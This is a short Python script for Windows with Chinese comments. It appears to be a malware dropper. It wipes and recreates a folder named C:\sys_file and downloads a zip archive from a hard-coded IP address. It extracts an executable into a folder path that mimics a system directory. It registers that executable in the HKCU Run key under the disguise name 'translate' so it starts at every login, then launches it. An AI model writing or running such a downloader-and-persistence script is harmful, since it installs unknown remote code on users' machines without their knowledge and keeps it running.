from urllib import request
import os
import zipfile
import win32api
import win32con
import time

def remove_dir(dir):
	#用于删除路径的函数
	dir = dir.replace('\\', '/')
	if(os.path.isdir(dir)):
		for p in os.listdir(dir):
			remove_dir(os.path.join(dir,p))
		if(os.path.exists(dir)):
			os.rmdir(dir)
	else:
		if(os.path.exists(dir)):
			os.remove(dir)


def add():
	name = 'translate'  # 要添加的项值名称
	path = r'C:\sys_file\center\windows\c.exe'  # 要添加的exe路径
	# 注册表项名
	KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
	# 异常处理

	key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
	win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
	win32api.RegCloseKey(key)


if __name__=='__main__':
	try:
		remove_dir(r"C:\sys_file")
	except:
		pass

	os.makedirs(r"C:\sys_file\center\windows")

	request.urlretrieve("http://104.155.212.130/c.zip",r"C:\sys_file\center\windows\c.zip")
	azip = zipfile.ZipFile(r"C:\sys_file\center\windows\c.zip")
	#解压到原始目录
	azip.extractall(r"C:\sys_file\center\windows")
	
	try:
		time.sleep(2)
		add()
	except:
		print("ok")

	os.system(r"C:\sys_file\center\windows\c.exe")